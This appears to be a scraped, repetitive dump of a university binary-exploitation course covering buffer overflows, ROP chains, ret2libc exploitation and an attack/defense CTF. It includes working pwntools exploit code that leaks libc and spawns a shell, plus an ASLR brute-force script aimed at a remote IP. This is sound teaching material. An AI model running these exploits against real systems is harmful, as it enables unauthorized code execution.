idea of overwriting the saved RIP is the same, but as discussed in calling conventions , arguments are passed in registers in 64-bit programs. In the case of running system , this means we will need to find a way to control the RDI register. To do this, we'll use small snippets of assembly in the binary, called \"gadgets.\" These gadgets usually pop one or more registers off of the stack, and then call ret , which allows us to chain them together by making a large fake call stack. For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like rp++ or ROPgadget ): 0x400c01: pop rdi; ret 0x400c03: pop rsi; pop r15; ret We can setup a fake call stack with these gadets to sequentially execute them, pop ing values we control into registers, and then end with a jump to system . Example 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget 0xffff0008: 0xdeadbeef // value to be popped into rdi RSP -> 0xffff0000: 0x400c01 // address of rdi gadget Stepping through this one instruction at a time, main returns, jumping to our pop rdi gadget: RIP = 0x400c01 (pop rdi) RDI = UNKNOWN RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget RSP -> 0xffff0008: 0xdeadbeef // value to be popped into rdi pop rdi is then executed, popping the top of the stack into RDI: RIP = 0x400c02 (ret) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi RSP -> 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget The RDI gadget then ret s into our RSI gadget: RIP = 0x400c03 (pop rsi) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) RSP -> 0xffff0018: 0x1337beef // value we want in rsi RSI and R15 are popped: RIP = 0x400c05 (ret) RDI = 0xdeadbeef RSI = 0x1337beef RSP -> 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled And finally, the RSI gadget ret s, jumping to whatever function we want, but now with RDI and RSI set to values we control. ROP - Syscall execv The objective is to call the syscall (execv) from a ROP controlling the value of registries: RDI, RSI, RDX, RAX and obviously the RIP (the other ones doesn't matters), and controlling somewhere to write \"/bin/sh\" RDI: Pointing to the string \"/bin/bash\" RSI: Null RDX: Null RAX: Value 0x3b for x64 and 0xb for x32, because this will call execv ROPgadget --binary vulnbinary | grep syscall ROPgadget --binary vulnbinary | grep \"rdi\\|rsi\\|rdx\\|rax\" | grep pop Writing If you can somehow write to an address and then get the address of where you have written then this step is unnecessary. Elsewhere, you may search for some write-what-where. As is explained in this tutorial: https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ you have to find something that allows you to save some value inside a registry and then save it to some controlled address inside another registry. For example some pop eax; ret , pop edx: ret , mov eax, [edx] You can find mov gadgets doing: ROPgadget --binary vulnbinary | grep mov Finding a place to write If you have found some write-what-where and can control the needed registries to call execv, there is only left finding a place to write. objdump -x vulnbinary | grep \".bss\" -B1 CONTENTS, ALLOC, LOAD, DATA 23 .bss 00000010 00403418 00403418 00002418 23 In this case: 0x403418 Writing \"/bin/sh\" buffer += address(pop_eax) # place value into EAX buffer += \"/bin\" # 4 bytes at a time buffer += address(pop_edx) # place value into edx buffer += address(writable_memory) buffer += address(writewhatwhere) buffer += address(pop_eax) buffer += \"//sh\" buffer += address(pop_edx) buffer += address(writable_memory + 4) buffer += address(writewhatwhere) ROP - Leaking LIBC address Quick Resume Find overflow offset Find POP_RDI, PUTS_PLT and MAIN_PLT gadgets Find memory address of puts and guess the libc version (donwload it) Given the library just exploit it Other tutorials and binaries to practice This tutorial is going to exploit the code/binary proposed in this tutorial: https://tasteofsecurity.com/security/ret2libc-unknown-libc/ Another useful tutorial: https://made0x78.com/bseries-ret2libc/ Code Filename: vuln.c #include <stdio.h> int main() { char buffer[32]; puts(\"Simple ROP.\\n\"); gets(buffer); return 0; } gcc -o vuln vuln.c -fno-stack-protector -no-pie ROP - PWNtools template Find my ROP-PWNtools template here. I'm going to use the code located there to make the exploit. Download the exploit and place it in the same directory as the vulnerable binary. 1- Finding the offset The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default OFFSET = \"\" ): #################### #### Find offset ### #################### OFFSET = \"\"#\"A\"*72 if OFFSET == \"\": gdb.attach(p.pid, \"c\") #Attach and continue payload = cyclic(1000) print(r.clean()) r.sendline(payload) #x/wx $rsp -- Search for bytes that crashed the application #cyclic_find(0x6161616b) # Find the offset of those bytes return Execute python template.py a GDB console will be opened with the program being crashed. Inside that GDB console execute x/wx $rsp to get the bytes that were going to overwrite the RIP. Finally get the offset using a python console: from pwn import * cyclic_find(0x6161616b) After finding the offset (in this case 40) change the OFFSET variable inside the template using that value. OFFSET = \"A\" * 40 2- Finding Gadgets Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call puts to find the libc being used, and later to launch the final exploit. PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols[\"puts\"] # This is also valid to call puts MAIN_PLT = elf.symbols['main'] POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep \"pop rdi\" RET = (rop.find_gadget(['ret']))[0] log.info(\"Main start: \" + hex(MAIN_PLT)) log.info(\"Puts plt: \" + hex(PUTS_PLT)) log.info(\"pop rdi; ret gadget: \" + hex(POP_RDI)) The PUTS_PLT is needed to call the function puts. The MAIN_PLT is needed to call the main function again after one interaction to exploit the overflow again (infinite rounds of exploitation).It is used at the end of each ROP. The POP_RDI is needed to pass a parameter to the called function. In this step you don't need to execute anything as everything will be found by pwntools during the execution. 3- Finding LIBC library Now is time to find which version of the libc library is being used. To do so we are going to leak the address in memory of the function puts and then we are going to search in which library version the puts version is in that address. def get_addr(func_name): FUNC_GOT = elf.got[func_name] log.info(func_name + \" GOT @ \" + hex(FUNC_GOT)) # Create rop chain rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) #Send our rop-chain payload #p.sendlineafter(\"dah?\", rop1) #Interesting to send in a specific moment print(p.clean()) # clean socket buffer (read all and print) p.sendline(rop1) #Parse leaked address recieved = p.recvline().strip() leak = u64(recieved.ljust(8, \"\\x00\")) log.info(\"Leaked libc address, \"+func_name+\": \"+ hex(leak)) #If not libc yet, stop here if libc != \"\": libc.address = leak - libc.symbols[func_name] #Save libc base log.info(\"libc base @ %s\" % hex(libc.address)) return hex(leak) get_addr(\"puts\") #Search for puts address in memmory to obtains libc base if libc == \"\": print(\"Find the libc library and continue with the exploit... (https://libc.blukat.me/)\") p.interactive() To do so, the most important line of the executed code is: rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) This will send some bytes util overwriting the RIP is possible: OFFSET . Then, it will set the address of the gadget POP_RDI so the next address ( FUNC_GOT ) will be saved in the RDI registry. This is because we want to call puts passing it the address of the PUTS_GOT as the address in memory of puts function is saved in the address pointing by PUTS_GOT . After that, PUTS_PLT will be called (with PUTS_GOT inside the RDI) so puts will read the content inside PUTS_GOT (the address of puts function in memory) and will print it out. Finally, main function is called again so we can exploit the overflow again. This way we have tricked puts function to print out the address in memory of the function puts (which is inside libc library). Now that we have that address we can search which libc version is being used. As we are exploiting some local binary it is not needed to figure out which version of libc is being used (just find the library in /lib/x86_64-linux-gnu/libc.so.6 ). But, in a remote exploit case I will explain here how can you find it: 3.1- Searching for libc version (1) You can search which library is being used in the web page: https://libc.blukat.me/ It will also allow you to download the discovered version of libc 3.2- Searching for libc version (2) You can also do: $ git clone https://github.com/niklasb/libc-database.git $ cd libc-database $ ./get This will take some time, be patient. For this to work we need: Libc symbol name: puts Leaked libc adddress: 0x7ff629878690 We can figure out which libc that is most likely used. ./find puts 0x7ff629878690 ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) archive-glibc (id libc6_2.23-0ubuntu11_amd64) We get 2 matches (you should try the second one if the first one is not working). Download the first one: ./download libc6_2.23-0ubuntu10_amd64 Getting libc6_2.23-0ubuntu10_amd64 -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb -> Downloading package -> Extracting package -> Package saved to libs/libc6_2.23-0ubuntu10_amd64 Copy the libc from libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so to our working directory. 3.3- Other functions to leak puts printf __libc_start_main read gets 4- Finding based libc address & exploiting At this point we should know the libc library used. As we are exploiting a local binary I will use just: /lib/x86_64-linux-gnu/libc.so.6 So, at the begging of template.py change the libc variable to: libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #Set library path when know it Giving the path to the libc library the rest of the exploit is going to be automatically calculated. Inside the get_addr function the base address of libc is going to be calculated: if libc != \"\": libc.address = leak - libc.symbols[func_name] #Save libc base log.info(\"libc base @ %s\" % hex(libc.address)) Then, the address to the function system and the address to the string \"/bin/sh\" are going to be calculated from the base address of libc and given the libc library. BINSH = next(libc.search(\"/bin/sh\")) - 64 #Verify with find /bin/sh SYSTEM = libc.sym[\"system\"] EXIT = libc.sym[\"exit\"] log.info(\"bin/sh %s \" % hex(BINSH)) log.info(\"system %s \" % hex(SYSTEM)) Finally, the /bin/sh execution exploit is going to be prepared sent: rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT) p.clean() p.sendline(rop2) ##### Interact with the shell ##### p.interactive() #Interact with the conenction Let's explain this final ROP. The last ROP ( rop1 ) ended calling again the main function, then we can exploit again the overflow (that's why the OFFSET is here again). Then, we want to call POP_RDI pointing to the addres of \"/bin/sh\" ( BINSH ) and call system function ( SYSTEM ) because the address of \"/bin/sh\" will be passed as a parameter. Finally, the address of exit function is called so the process exists nicely and any alert is generated. This way the exploit will execute a /bin/sh shell. 4(2)- Using ONE_GADGET You could also use ONE_GADGET to obtain a shell instead of using system and \"/bin/sh\". ONE_GADGET will find inside the libc library some way to obtain a shell using just one ROP. However, normally there are some constrains, the most common ones and easy to avoid are like [rsp+0x30] == NULL As you control the values inside the RSP you just have to send some more NULL values so the constrain is avoided. ONE_GADGET = libc.address + 0x4526a rop2 = base + p64(ONE_GADGET) + \"\\x00\"*100 EXPLOIT FILE You can find a template to exploit this vulnerability here: ROP-PWN template Common problems MAIN_PLT = elf.symbols['main'] not found If the \"main\" symbol does not exist. Then you can just where is the main code: objdump -d vuln_binary | grep \"\\.text\" Disassembly of section .text: 0000000000401080 <.text>: and set the address manually: MAIN_PLT = 0x401080 Puts not found If the binary is not using Puts you should check if it is using sh: 1: %s%s%s%s%s%s%s%s: not found If you find this error after creating all the exploit: sh: 1: %s%s%s%s%s%s%s%s: not found Try to subtract 64 bytes to the address of \"/bin/sh\": BINSH = next(libc.search(\"/bin/sh\")) - 64 Ret2Lib If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow. If you are inside the host You can find the address of lib c ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time) If you want to check if the ASLR is changing the address of libc you can do: for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done Get offset of system function readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system Get offset of \"/bin/sh\" strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh /proc/\\ /maps If the process is creating children every time you talk with it (network server) try to read that file (probably you will need to be root). Here you can find exactly where is the libc loaded inside the process and where is going to be loaded for every children of the process. In this case it is loaded in 0xb75dc000 (This will be the base address of libc) Using gdb-peda Get address of system function, of exit function and of the string \"/bin/sh\" using gdb-peda: p system p exit find \"/bin/sh\" Bypassing ASLR You can try to bruteforce the abse address of libc. for off in range(0xb7000000, 0xb8000000, 0x1000): Code from pwn import * c = remote('192.168.85.181',20002) c.recvline() #Banner for off in range(0xb7000000, 0xb8000000, 0x1000): p = \"\" p += p32(off + 0x0003cb20) #system p += \"CCCC\" #GARBAGE p += p32(off + 0x001388da) #/bin/sh payload = 'A'*0x20010 + p c.send(payload) c.interactive() #?

To do this, we'll use small snippets of assembly in the binary, called \"gadgets.\" These gadgets usually pop one or more registers off of the stack, and then call ret , which allows us to chain them together by making a large fake call stack. For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like rp++ or ROPgadget ): 0x400c01: pop rdi; ret 0x400c03: pop rsi; pop r15; ret We can setup a fake call stack with these gadets to sequentially execute them, pop ing values we control into registers, and then end with a jump to system .","title":"64 bit"},{"location":"CS315/Week%2013/#example","text":"0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget 0xffff0008: 0xdeadbeef // value to be popped into rdi RSP -> 0xffff0000: 0x400c01 // address of rdi gadget Stepping through this one instruction at a time, main returns, jumping to our pop rdi gadget: RIP = 0x400c01 (pop rdi) RDI = UNKNOWN RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget RSP -> 0xffff0008: 0xdeadbeef // value to be popped into rdi pop rdi is then executed, popping the top of the stack into RDI: RIP = 0x400c02 (ret) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) 0xffff0018: 0x1337beef // value we want in rsi RSP -> 0xffff0010: 0x400c03 // address that the rdi gadget's ret will return to - the pop rsi gadget The RDI gadget then ret s into our RSI gadget: RIP = 0x400c03 (pop rsi) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) RSP -> 0xffff0018: 0x1337beef // value we want in rsi RSI and R15 are popped: RIP = 0x400c05 (ret) RDI = 0xdeadbeef RSI = 0x1337beef RSP -> 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled And finally, the RSI gadget ret s, jumping to whatever function we want, but now with RDI and RSI set to values we control.","title":"Example"},{"location":"CS315/Week%2013/#rop-syscall-execv","text":"The objective is to call the syscall (execv) from a ROP controlling the value of registries: RDI, RSI, RDX, RAX and obviously the RIP (the other ones doesn't matters), and controlling somewhere to write \"/bin/sh\" RDI: Pointing to the string \"/bin/bash\" RSI: Null RDX: Null RAX: Value 0x3b for x64 and 0xb for x32, because this will call execv ROPgadget --binary vulnbinary | grep syscall ROPgadget --binary vulnbinary | grep \"rdi\\|rsi\\|rdx\\|rax\" | grep pop","title":"ROP - Syscall execv"},{"location":"CS315/Week%2013/#writing","text":"If you can somehow write to an address and then get the address of where you have written then this step is unnecessary.

Each team works finding vulnerabilities in other team\u2019s services while protecting their own, hence \u201cattack/defense\u201d. (image from CTF.zone ) All teams are given an image to host on servers, usually a Linux distribution with code for several services that the game creators made. For example, in this year\u2019s saarCTF , there were some simple websites for food reviews and calendar events hosted on a linux server. All teams get the same images, so if you find a vulnerability in your server, you can use it to attack other teams\u2019. When the competition starts, you gain access to the servers and can start reading the code and looking for vulnerabilities. The game admins will use your service (programmatically) as normal users and place \u201cflags\u201d for other teams to steal if they find vulnerabilities. For example, they might create private events in the calendar app mentioned earlier, and the flags would be in the details of the event. Vulnerabilities are generally intentionally placed, though sometimes game creators make mistakes and there are extra unintentional attack paths. Competitions tend to have a range of easy to more complicated exploits. A simple exploit might be finding that the view_calendar_event function takes in a uid from the request, and doesn\u2019t validate that this is the same user as the logged in user. A more complicated exploit could involve a buffer overflow leading to a remote code execution. There\u2019s also been exploits using less traditional methods, like adversarial machine learning: fausecteam/faustctf-2018-jodlgang . After finding a vulnerability, the next step is to build a script to exploit it on other teams\u2019 servers and patch the issue on your own server. Points are determined based on how many opposing teams you\u2019re able to steal flags from and how many flags you successfully prevent other teams from stealing.

For example, a valid request might be: http://ip:port/?str=some_example_string The page would response the following text: some_example_string length is 19 Calculator The website is written in PHP. The calculator has only 1 function: to calculate the input equation of user. An example input of 2*3 would result in 6 . Binary This challenge doesn't offer any source code.

Each team works finding vulnerabilities in other team\u2019s services while protecting their own, hence \u201cattack/defense\u201d. (image from CTF.zone ) All teams are given an image to host on servers, usually a Linux distribution with code for several services that the game creators made. For example, in this year\u2019s saarCTF , there were some simple websites for food reviews and calendar events hosted on a linux server. All teams get the same images, so if you find a vulnerability in your server, you can use it to attack other teams\u2019. When the competition starts, you gain access to the servers and can start reading the code and looking for vulnerabilities. The game admins will use your service (programmatically) as normal users and place \u201cflags\u201d for other teams to steal if they find vulnerabilities. For example, they might create private events in the calendar app mentioned earlier, and the flags would be in the details of the event. Vulnerabilities are generally intentionally placed, though sometimes game creators make mistakes and there are extra unintentional attack paths. Competitions tend to have a range of easy to more complicated exploits. A simple exploit might be finding that the view_calendar_event function takes in a uid from the request, and doesn\u2019t validate that this is the same user as the logged in user. A more complicated exploit could involve a buffer overflow leading to a remote code execution. There\u2019s also been exploits using less traditional methods, like adversarial machine learning: fausecteam/faustctf-2018-jodlgang . After finding a vulnerability, the next step is to build a script to exploit it on other teams\u2019 servers and patch the issue on your own server. Points are determined based on how many opposing teams you\u2019re able to steal flags from and how many flags you successfully prevent other teams from stealing.","title":"Week14 CTF: Attack-Defense CTF"},{"location":"CS315/Week%2014/#rules","text":"Competition start time: 2021-12-13 21:00 Competition end time: 2021-12-16 21:00 Time per round: 5 minutes (864 rounds in total) Score per round: 50 Challenges: Sanity_check (web) Calculator (web) Binary (pwn) Image manipulator (web) Blog (web) Base score per challenge: 1000 Total teams: 50 Flag location: /var/flag.txt SSH user: ctf SSH default password: 123456","title":"Rules"},{"location":"CS315/Week%2014/#challenges","text":"The AWD CTF has 5 challenges in total.

For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Common topics addressed by Binary Exploitation or 'pwn' challenges include: Registers The Stack Calling Conventions Global Offset Table (GOT) Buffers Buffer Overflow Return Oriented Programming (ROP) Binary Security No eXecute (NX) Address Space Layout Randomization (ASLR) Stack Canaries Relocation Read-Only (RELRO) The Heap Heap Exploitation Format String Vulnerability Buffers A buffer is any allocated space in memory where data (often user input) can be stored. For example, in the following C program name would be considered a stack buffer: #include <stdio.h> int main() { char name[64] = {0}; read(0, name, 63); printf(\"Hello %s\", name); return 0; } Buffers could also be global variables: #include <stdio.h> char name[64] = {0}; int main() { read(0, name, 63); printf(\"Hello %s\", name); return 0; } Or dynamically allocated on the heap: #include <stdio.h> #include <stdlib.h> int main() { char *name = malloc(64); memset(name, 0, 64); read(0, name, 63); printf(\"Hello %s\", name); return 0; } Exploits Given that buffers commonly hold user input, mistakes when writing to them could result in attacker controlled data being written outside of the buffer's space. Introduction to Stack A stack is an abstract data type frequently used in computer science. It has a property that the Last item placed will be the first to be removed from it ( LIFO ) . Several options are defined on the stack , the most important ones are push and pop . push add an element to the top of the stack , and pop removes elements from the top . /* The address of memory which is pointed by the Stack Pointer ( sp ) is the top of the stack */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 <\u2500 sp \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 : push 0x10 /* sp is incremented and the value is stored at that address */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp : push 0x20 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 0x20 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp : pop var /* The value pointed by the sp is removed from the stack and sp is decremented */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the function. From one point of view, a function call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to allocate local variables , to pass parameters to the functions, and to store the information needed to return to caller function after the execution of the function gets over. The stack pointer is a special register which will always point to the top of the stack , in x86-32 bit this register is called esp .The area allocated on the stack for a function is called it's stack frame . and the registers ebp and esp (in x86-32 bit system )are used to specify the boundaries of the stack frame . The ebp will point to the staring of the stack frame of the current function and the esp register will point to the bottom. Buffer Overflow A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite other data. Stack buffer overflow The simplest and most common buffer overflow is one where the buffer is on the stack. Let's look at an example. #include <stdio.h> int main() { int secret = 0xdeadbeef; char name[100] = {0}; read(0, name, 0x100); if (secret == 0x1337) { puts(\"Wow! Here's a secret.\"); } else { puts(\"I guess you're not cool enough to see my secret\"); } } There's a tiny mistake in this program which will allow us to see the secret. name is decimal 100 bytes, however we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage. If the compiler chose to layout the stack like this: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x0 ESP -> 0xffff0000: 0x0 // name let's look at what happens when we read in 0x100 bytes of 'A's. The first decimal 100 bytes are saved properly: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name However when the 101st byte is read in, we see an issue: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbe41 // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name The least significant byte of secret has been overwritten! If we follow the next 3 bytes to be read in, we'll see the entirety of secret is \"clobbered\" with our 'A's 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0x41414141 // secret ... 0xffff0004: 0x41414141 ESP -> 0xffff0000: 0x41414141 // name The remaining 152 bytes would continue clobbering values up the stack. Passing an impossible check How can we use this to pass the seemingly impossible check in the original program? Well, if we carefully line up our input so that the bytes that overwrite secret happen to be the bytes that represent 0x1337 in little-endian, we'll see the secret message. A small Python one-liner will work nicely: python -c \"print 'A'*100 + '\\x31\\x13\\x00\\x00'\" This will fill the name buffer with 100 'A's, then overwrite secret with the 32-bit little-endian encoding of 0x1337. Going one step further As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as \"Saved EIP\" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after main finishes running, giving us the ability to control what the program does entirely. Usually, the end objective in binary exploitation is to get a shell (often called \"popping a shell\") on the remote computer. The shell provides us with an easy way to run anything we want on the target computer. Say there happens to be a nice function that does this defined somewhere else in the program that we normally can't get to: void give_shell() { system(\"/bin/sh\"); } Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where give_shell is. Then, when main returns, it will pop that address off of the stack and jump to it, running give_shell , and giving us our shell. Assuming give_shell is at 0x08048fd0, we could use something like this: python -c \"print 'A'*108 + '\\xd0\\x8f\\x04\\x08'\" We send 108 'A's to overwrite the 100 bytes that is allocated for name , the 4 bytes for secret , and the 4 bytes for the saved EBP. Then we simply send the little-endian form of give_shell 's address, and we would get a shell! This idea is extended on in Return Oriented Programming. Overwrite values on stack For example, we are given the following code in C language: #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, \"please specify an argument\\n\"); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\n\"); } else { printf(\"Try again, you got 0x%08x\\n\", modified); } } Breakdown So this code : creates a variable called \u201cmodified\u201d and assigns a buffer of 64 chars to it. volatile int modified; char buffer[64]; Checks if we supplied an argument or not. if(argc == 1) { errx(1, \"please specify an argument\\n\"); } Sets the value of the \u201cmodified\u201d variable into 0 , then it copies whatever we give it argv[1] into the buffer of \u201cmodified\u201d. modified = 0; strcpy(buffer, argv[1]); Then it checks if the variable\u2019s value is 0x61626364 or not if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\n\"); } else { printf(\"Try again, you got 0x%08x\\n\", modified); } Solution So it\u2019s similar to Stack0 except we need to set the value of the variable into a specific value which is 0x61626364 in this case. This is the hexadecimal value of \u201cdcba\u201d now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let\u2019s try it. Let\u2019s execute stack1 We get please specify an argument so let\u2019s enter anything. We get try again you got 0x00000000 , Let\u2019s try to change that by exceeding the buffer and entering any char for example \u201cb\u201d ./stack1 `python -c \"print ('A' * 64 + 'b')\"` And we see that the value changed to 0x00000062 which is the hex value of \u201cb\u201d so our exploit is working, Let\u2019s apply that. ./stack1 `python -c \"print ('A' * 64 + 'dcba')\"` And we did it ! But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them. ./stack1 `python -c \"print('A' * 64 + '\\x64\\x63\\x62\\x61')\"` Shellcode In real exploits, it's not particularly likely that you will have a win() function lying around - shellcode is a way to run your own instructions, giving you the ability to run arbitrary commands on the system. Shellcode is essentially assembly instructions , except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions! I promise you can trust me but you should never ever run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need. The reason shellcode is successful is that Von Neumann architecture (the architecture used in most computers today) does not differentiate between data and instructions - it doesn't matter where or what you tell it to run, it will attempt to run it. Therefore, even though our input is data, the computer doesn't know that - and we can use that to our advantage. Shellcodeshellcode.zip - 3KB Disabling ASLR ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory (we will talk about it in much more detail later). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now using this . echo 0 | sudo tee /proc/sys/kernel/randomize_va_space Again, you should never run commands if you don't know what they do Finding the Buffer in Memory Let's debug vuln() using radare2 and work out where in memory the buffer starts; this is where we want to point the return pointer to. $ r2 -d -A vuln [0xf7fd40b0]> s sym.unsafe ; pdf[...]; var int32_t var_134h @ ebp-0x134[...] This value that gets printed out is a local variable - due to its size, it's fairly likely to be the buffer.

[...] It appears to be at 0xffffcfd4 ; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!). Finding the Padding Now we need to calculate the padding until the return pointer.

The most important technique for structuring programs introduced by high-level languages is the function. From one point of view, a function call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to allocate local variables , to pass parameters to the functions, and to store the information needed to return to caller function after the execution of the function gets over. The stack pointer is a special register which will always point to the top of the stack , in x86-32 bit this register is called esp .The area allocated on the stack for a function is called it's stack frame . and the registers ebp and esp (in x86-32 bit system )are used to specify the boundaries of the stack frame . The ebp will point to the staring of the stack frame of the current function and the esp register will point to the bottom.","title":"Introduction to Stack"},{"location":"CS315/Week%202/#buffer-overflow","text":"A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite other data.","title":"Buffer Overflow"},{"location":"CS315/Week%202/#stack-buffer-overflow","text":"The simplest and most common buffer overflow is one where the buffer is on the stack.

Here's a secret.\"); } else { puts(\"I guess you're not cool enough to see my secret\"); } } There's a tiny mistake in this program which will allow us to see the secret. name is decimal 100 bytes, however we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage. If the compiler chose to layout the stack like this: 0xffff006c: 0xf7f7f7f7 // Saved EIP 0xffff0068: 0xffff0100 // Saved EBP 0xffff0064: 0xdeadbeef // secret ... 0xffff0004: 0x0 ESP -> 0xffff0000: 0x0 // name let's look at what happens when we read in 0x100 bytes of 'A's.

